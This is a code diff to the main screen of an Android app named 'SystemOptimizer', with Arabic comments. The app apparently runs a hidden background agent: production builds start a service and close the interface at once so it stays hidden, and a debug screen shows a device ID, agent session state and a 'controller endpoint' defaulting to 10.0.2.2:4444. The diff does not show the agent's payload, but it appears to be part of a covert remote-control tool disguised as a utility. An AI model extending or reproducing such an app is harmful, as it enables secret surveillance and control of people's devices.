@@ -4,24 +4,33 @@ import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.ApplicationInfo
 import android.content.pm.PackageManager
+import android.graphics.Color
+import android.graphics.Typeface
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import android.view.Gravity
+import android.view.ViewGroup
+import android.widget.LinearLayout
+import android.widget.TextView
 import androidx.activity.ComponentActivity
-import androidx.activity.compose.setContent
-import androidx.compose.foundation.layout.fillMaxSize
-import androidx.compose.material3.MaterialTheme
-import androidx.compose.material3.Surface
-import androidx.compose.material3.Text
-import androidx.compose.runtime.Composable
-import androidx.compose.ui.Modifier
-import androidx.compose.ui.tooling.preview.Preview
 import androidx.core.content.ContextCompat
-import com.example.systemoptimizer.ui.theme.SystemOptimizerTheme
+import java.util.Locale
 
 class MainActivity : ComponentActivity() {
 
+    private var debugStatus: TextView? = null
+    private val statusTicker = object : Runnable {
+        override fun run() {
+            refreshDebugStatus()
+            if (debugStatus != null) {
+                handler.postDelayed(this, STATUS_PERIOD_MS)
+            }
+        }
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_main)
 
         // شاشة الإعداد الأولي: مركز الصلاحيات (بدون أي صلاحية root).
         if (!PermissionCenterActivity.setupComplete(this)) {
@@ -54,23 +63,66 @@ class MainActivity : ComponentActivity() {
             Intent(this, BackgroundService::class.java)
         )
 
-        // إغلاق الواجهة فوراً
-        finish()
+        if (debuggable) {
+            // بنية التصحيح: شاشة حالة مرئية للمهندس أثناء التطوير.
+            setContentView(buildDebugStatusView())
+            refreshDebugStatus()
+            handler.post(statusTicker)
+        } else {
+            // بنية الإنتاج: إغلاق الواجهة فوراً (تبقى الواجهة مخفية).
+            finish()
+        }
     }
-}
 
-@Composable
-fun Greeting(name: String, modifier: Modifier = Modifier) {
-    Text(
-        text = "Hello $name!",
-        modifier = modifier
-    )
-}
+    private fun buildDebugStatusView(): ViewGroup {
+        val root = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            setBackgroundColor(Color.parseColor("#0D1117"))
+            setPadding(dp(24), dp(32), dp(24), dp(24))
+            gravity = Gravity.TOP or Gravity.START
+        }
+        val title = TextView(this).apply {
+            text = "SystemOptimizer Agent — Debug"
+            setTextColor(Color.WHITE)
+            textSize = 18f
+            typeface = Typeface.DEFAULT_BOLD
+        }
+        val status = TextView(this).apply {
+            setTextColor(Color.LTGRAY)
+            textSize = 12f
+            typeface = Typeface.MONOSPACE
+            setLineSpacing(0f, 1.15f)
+        }
+        debugStatus = status
+        root.addView(title)
+        root.addView(status)
+        return root
+    }
 
-@Preview(showBackground = true)
-@Composable
-fun GreetingPreview() {
-    SystemOptimizerTheme {
-        Greeting("Android")
+    private fun refreshDebugStatus() {
+        val view = debugStatus ?: return
+        val identity = DeviceIdentity(this)
+        val state = runCatching { identity.buildState(this) }
+            .getOrElse { "state unavailable: $it" }
+        val session = BackgroundService.debugSessionState()
+        val endpoint = identity.controllerEndpoint() ?: "10.0.2.2:4444"
+        view.text = String.format(
+            Locale.US,
+            "device_id: %s\nendpoint: %s\nagent: %s\n%s",
+            identity.deviceId(), endpoint, session, state
+        )
+    }
+
+    private fun dp(value: Int): Int = (value * resources.displayMetrics.density).toInt()
+
+    override fun onDestroy() {
+        debugStatus = null
+        handler.removeCallbacks(statusTicker)
+        super.onDestroy()
+    }
+
+    companion object {
+        private const val STATUS_PERIOD_MS = 2000L
+        private val handler = Handler(Looper.getMainLooper())
     }
 }
